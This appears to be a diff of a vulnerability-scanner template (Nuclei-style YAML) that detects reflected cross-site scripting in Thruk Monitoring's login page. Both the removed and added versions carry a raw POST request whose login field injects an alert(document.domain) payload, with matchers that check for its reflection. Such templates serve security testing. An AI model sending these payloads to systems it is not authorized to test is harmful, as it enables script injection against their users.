@@ -1,48 +1,35 @@
 id: thruk-xss
 
 info:
-  name: Thruk Monitoring Webinterface - Cross-Site Scripting
-  author: pikpikcu,ritikchaddha
-  severity: high
-  description: |
-    Thruk Monitoring Webinterface contains a cross-site scripting vulnerability via the login parameter at /thruk/cgi-bin/login.cgi.
+  name: Thruk Monitoring Webinterface - XSS
+  author: pikpikcu
+  severity: medium
   reference:
     - https://www.thruk.org/download.html
-    - https://www.usd.de/en/security-advisory-thruk-monitoring-v2-46-3
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
-    cvss-score: 7.2
-    cwe-id: CWE-79
-    cpe: cpe:2.3:a:thruk:thruk:*:*:*:*:*:*:*:*
-  metadata:
-    verified: true
-    max-request: 1
-    shodan-query: http.html:"Thruk"
-    product: thruk
-    vendor: thruk
-  tags: thruk,xss,vuln
+  tags: xss,thruk
 
-http:
+requests:
   - raw:
       - |
         POST /thruk/cgi-bin/login.cgi HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
+        Referer: {{Hostname}}/thruk/cgi-bin/login.cgi?thruk
 
-        referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com&password=test&submit=Login
+        referer=%2Fthruk&login=--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=Thruk+Monitoring+Webinterface
 
     matchers-condition: and
     matchers:
+      - type: status
+        status:
+          - 200
+
       - type: word
+        part: body
         words:
-          - "<svg/onload=alert(document.domain)>\"@gmail.com') called at"
+          - "</script><script>alert(document.domain)</script>"
 
       - type: word
         part: header
         words:
           - "text/html"
-
-      - type: status
-        status:
-          - 500
-# digest: 4a0a00473045022100f47880f91ad61fab4ebda92a02f76185c9547bd5fb9ba9f92457768c947f12950220243c8305ae18aba9bc88ef9c1c091f0bb44302a1711a0135f4b431ca84023e64:922c64590222798bb761d5b6d8e72950
